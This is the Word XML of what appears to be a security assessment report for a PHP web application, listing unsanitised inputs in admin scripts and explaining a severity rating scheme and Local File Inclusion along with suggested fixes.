              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C987978" w14:textId="5A41A27A" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="632F7FD0" w14:textId="4078D453" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E5638D3" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-member.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4CCEFA87" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B6DDAE5" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="767644EC" w14:textId="0670E8FC" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="5603B745" w14:textId="323F0A98" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30472D93" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-message.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35AC2BA2" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2912A76A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3786429C" w14:textId="5C1B476B" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="334AAAD7" w14:textId="34B628E6" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="679AC05C" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-order.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="36D271A6" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="425EBA2E" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B4BCB4F" w14:textId="4EAA4E90" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="511312BE" w14:textId="35C361AD" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5288D43E" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-reservation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66433C11" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C644772" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23870ABB" w14:textId="6F0A797B" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="41BB8B1C" w14:textId="0EB37C75" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="63C2EFBE" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-special.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48743B5E" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E165BD8" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16BA43C9" w14:textId="31A5DC41" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="3C03AC64" w14:textId="02C7411A" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="52D49606" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-staff.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="408C50C0" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6202B728" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="31193612" w14:textId="6756B92A" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="50076706" w14:textId="2F3C3027" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="73F94607" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/update-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D00623F" w14:textId="2407406C" w:rsidR="002C1419" w:rsidRDefault="005D4CF8" w:rsidP="002C1419">
            <w:r>
              <w:t>34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="52C5CD59" w14:textId="4ADA9EC1" w:rsidR="002C1419" w:rsidRDefault="005D4CF8" w:rsidP="002C1419">
            <w:r>
              <w:t>Here the ID is set based on a value on the URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="331009F5" w14:textId="67D61C53" w:rsidR="002C1419" w:rsidRDefault="005D4CF8" w:rsidP="002C1419">
            <w:r>
              <w:t>This should take the ID from the Session cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="61A696A7" w14:textId="095AC1EA" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="470843F8" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2324656D" w14:textId="372D8754" w:rsidR="002C1419" w:rsidRDefault="005D4CF8" w:rsidP="002C1419">
            <w:r>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4653C264" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79CDF38A" w14:textId="65392F37" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D534539" w14:textId="709EEBCC" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BC8F729" w14:textId="51253A50" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Vulnerabilities and Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CC3332" w14:textId="7D9D799D" w:rsidR="00C75FD8" w:rsidRPr="00292DEC" w:rsidRDefault="00C75FD8" w:rsidP="00C75FD8">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">When analysing a vulnerability, it is important to understand the severity of the flaw as well as what it can be used for. To make this easier to follow a colour coding system </w:t>
      </w:r>
      <w:r w:rsidR="00E214A3" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> used to depict how bad the vulnerability is based on the opinion of the author. This colour will be </w:t>
      </w:r>
      <w:r w:rsidR="00E214A3" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>derived from</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>; how easy it is to find, How easy it is to exploit and how much damage it can do. It is important to stress that even a low vulnerability is still a vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="00703BCF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. This is meant to help administrators prioritise which vulnerabilities to solve first, not </w:t>
      </w:r>
      <w:r w:rsidR="00E214A3" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">to imply that some </w:t>
      </w:r>
      <w:r w:rsidR="00703BCF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>can be ignored.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3AFEA2" w14:textId="15D4EFB7" w:rsidR="00C75FD8" w:rsidRDefault="00C75FD8" w:rsidP="00C75FD8">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2337"/>
        <w:gridCol w:w="2337"/>
        <w:gridCol w:w="2338"/>
        <w:gridCol w:w="2338"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C75FD8" w14:paraId="3CEBBA36" w14:textId="77777777" w:rsidTr="00703BCF">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2337" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="4DA4D8" w:themeFill="accent3" w:themeFillTint="99"/>
          </w:tcPr>
          <w:p w14:paraId="446DAD83" w14:textId="2148B2C3" w:rsidR="00C75FD8" w:rsidRDefault="00C75FD8" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="55" w:name="_Hlk61172263"/>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2337" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="B35E06" w:themeFill="accent1" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="3EA645D1" w14:textId="15CDC846" w:rsidR="00C75FD8" w:rsidRDefault="00C75FD8" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2338" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="761E28" w:themeFill="accent2" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0BD14ADB" w14:textId="4386B822" w:rsidR="00C75FD8" w:rsidRDefault="00C75FD8" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2338" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0D0D0D" w:themeFill="text1" w:themeFillTint="F2"/>
          </w:tcPr>
          <w:p w14:paraId="7731648F" w14:textId="091CE4E3" w:rsidR="00C75FD8" w:rsidRDefault="00C75FD8" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="55"/>
    </w:tbl>
    <w:p w14:paraId="0108FD3B" w14:textId="694F3DEA" w:rsidR="00C75FD8" w:rsidRDefault="00C75FD8" w:rsidP="00C75FD8">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2441B187" w14:textId="1D4F7678" w:rsidR="00C75FD8" w:rsidRPr="00292DEC" w:rsidRDefault="00703BCF" w:rsidP="00C75FD8">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">These vulnerabilities will then be given a rating based on how easy they should be to solve. Again, this is based on the opinion of the author and </w:t>
      </w:r>
      <w:r w:rsidR="00E214A3" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>assumptions as to the</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> basic skills of the administrator implementing these patches.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="1271" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="2127"/>
      </w:tblGrid>
      <w:tr w:rsidR="00703BCF" w14:paraId="103CAFBA" w14:textId="77777777" w:rsidTr="00703BCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="002CF573" w14:textId="5633C0B8" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="56" w:name="_Hlk61172295"/>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
          </w:tcPr>
          <w:p w14:paraId="57D0DCC5" w14:textId="5DF7E429" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Intermediate</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2127" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
          </w:tcPr>
          <w:p w14:paraId="02B260EA" w14:textId="216E9349" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Hard</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="56"/>
    </w:tbl>
    <w:p w14:paraId="480CF8F6" w14:textId="557C62E5" w:rsidR="00292DEC" w:rsidRDefault="00292DEC" w:rsidP="00C75FD8">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FEAD4EB" w14:textId="77777777" w:rsidR="00292DEC" w:rsidRDefault="00292DEC">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDBCFD5" w14:textId="1561E213" w:rsidR="00790807" w:rsidRDefault="0091492F" w:rsidP="00225A89">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Local File Inclusion </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2338"/>
        <w:gridCol w:w="2268"/>
      </w:tblGrid>
      <w:tr w:rsidR="00703BCF" w14:paraId="5FAC46E8" w14:textId="27053FED" w:rsidTr="00703BCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2338" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0D0D0D" w:themeFill="text1" w:themeFillTint="F2"/>
          </w:tcPr>
          <w:p w14:paraId="7C944872" w14:textId="77777777" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
          </w:tcPr>
          <w:p w14:paraId="0F723A92" w14:textId="2C3DB3DB" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Intermediate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="030FC613" w14:textId="77777777" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63CE3505" w14:textId="40972FC1" w:rsidR="0091492F" w:rsidRPr="00292DEC" w:rsidRDefault="00703BCF" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="005D0C32" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">ocal File Inclusion (LFI) is the ability to navigate local files contained on the server. Using this it is possible for an attacker to enumerate usernames and sometimes passwords of the machine hosting the web server. This can pose a direct risk to the security of the web server because if a malicious user has access to the  servers command line it would </w:t>
      </w:r>
      <w:r w:rsidR="002621DF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>essentially</w:t>
      </w:r>
      <w:r w:rsidR="005D0C32" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> grant </w:t>
      </w:r>
      <w:r w:rsidR="002621DF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>unrestricted access</w:t>
      </w:r>
      <w:r w:rsidR="005D0C32" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> for them to extract user data and tamper with</w:t>
      </w:r>
      <w:r w:rsidR="002621DF" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> the data held on the server. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64110049" w14:textId="505B2B69" w:rsidR="002621DF" w:rsidRPr="00292DEC" w:rsidRDefault="002621DF" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">One way to </w:t>
      </w:r>
      <w:r w:rsidR="000620CA" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">avoid this vulnerability is to set up a white list of files users are allowed </w:t>
      </w:r>
      <w:r w:rsidR="00DF15E1" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>to access.</w:t>
      </w:r>
      <w:r w:rsidR="00ED3417" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
